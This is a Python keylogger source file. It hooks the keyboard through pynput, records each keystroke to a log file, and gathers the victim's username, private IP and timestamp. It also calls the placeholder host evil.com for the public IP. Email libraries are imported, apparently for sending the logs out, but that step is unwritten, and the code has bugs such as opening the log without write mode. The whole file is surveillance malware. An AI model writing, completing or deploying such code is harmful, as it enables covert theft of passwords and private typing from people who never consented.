from pynput.keyboard import Key, Listener
import time
import os
import requests
import socket
from email.message import EmailMessage
import smtplib

urls='https://evil.com'
PublicIP = requests.get(urls).text
PrivateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[0]
datetime= time.ctime(time.time())

print(PublicIP)
print(PrivateIP)
print(datetime)
print(user) 

msg =f'[LOGGING]\n DateTime: {datetime}\n User: {user}\n Public IP: {urls}\n Private IP: {PrivateIP}\n'


class Keylogger:
    def __init__(self):
        self.start_time = time.time()
        self.shift = False
        self.caps = False
        pass


    def write_key(self,key):
        with open("./log.txt") as file:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            elif key==Key.shift:
                if not self.shift:
                    self.shift=True
            elif key==Key.caps_lock:
                if not self.caps:
                    self.caps=True
            
            else:
                try:
                    if key.char.isalpha():
                        if self.shift or self.caps:
                            file.write(key.char.upper())
                        else:
                            file.write(key.char)
                    elif key.char.isdigit():
                        if self.shift:
                            file.write(key.char)
                        else:
                            file.write(key.char)
                    else:
                        if self.shift:
                            file.write(key.char)
                        else:
                            file.write(key.char)
                except:
                    pass
        

    def check_shift(self,key):
        pass
    



keylog =Keylogger()
key =''
with Listener(on_press=keylog.write_key,on_release=keylog.check_shift) as listener:
    listener.join()